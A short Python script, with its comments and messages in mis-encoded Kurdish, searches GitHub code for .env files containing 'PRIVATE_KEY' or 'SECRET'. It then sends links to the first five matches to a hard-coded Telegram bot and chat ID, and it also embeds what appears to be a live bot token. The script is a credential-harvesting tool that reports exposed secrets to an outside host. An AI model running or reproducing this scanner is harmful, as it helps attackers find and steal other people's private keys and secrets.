import requests
import os
import re

# Ø²Ø§Ù†ÛŒØ§Ø±ÛŒÛŒÛ•Ú©Ø§Ù†Øª (Ø¯ÚµÙ†ÛŒØ§Ø¨Û• ÙˆÛ•Ú© Ø®Û†ÛŒÛ•ØªÛŒ)
TELEGRAM_TOKEN = "8363879675:AAGOXZfmpGBNUY9DUyUR5DpyaDPcUmYmd50"
CHAT_ID = "7955490868"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=payload)
    except:
        pass

def github_hunter():
    print("ğŸ›°ï¸ Scanning GitHub...")
    # Ø³ÛØ±Ú†ÛÚ©ÛŒ Ú¯Ø´ØªÛŒ Ø¨Û† ÙØ§ÛŒÙ„Û• Ø­Û•Ø³Ø§Ø³Û•Ú©Ø§Ù†
    query = 'filename:.env "PRIVATE_KEY" OR "SECRET"'
    headers = {"Authorization": f"token {os.getenv('GH_TOKEN')}"}
    
    url = f"https://api.github.com/search/code?q={query}&sort=indexed"
    
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            for item in data.get('items', [])[:5]:
                file_url = item['html_url']
                repo_name = item['repository']['full_name']
                
                msg = f"ğŸ¯ **Ú¯Û•Ù†Ø¬ÛŒÙ†Û•ÛŒÛ•Ú©ÛŒ Ù†ÙˆÛ Ø¯Û†Ø²Ø±Ø§ÛŒÛ•ÙˆÛ•!**\n\nğŸ“¦ Ú•ÛŒÙ¾Û†: `{repo_name}`\nğŸ”— Ù„ÛŒÙ†Ú©: [Ú©Ù„ÛŒÚ© Ø¨Ú©Û• Ø¨Û† Ø¨ÛŒÙ†ÛŒÙ†]({file_url})"
                send_telegram(msg)
        elif response.status_code == 401:
            send_telegram("âŒ Ù‡Û•ÚµÛ•: GH_TOKEN Ú©Ø§Ø± Ù†Ø§Ú©Ø§Øª ÛŒØ§Ù† Ø³Û•ÚµØ§Ø­ÛŒÛ•ØªÛ•Ú©Û•ÛŒ Ú©Û•Ù…Û•.")
        elif response.status_code == 403:
            print("Rate limit hit. Waiting...")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    github_hunter()
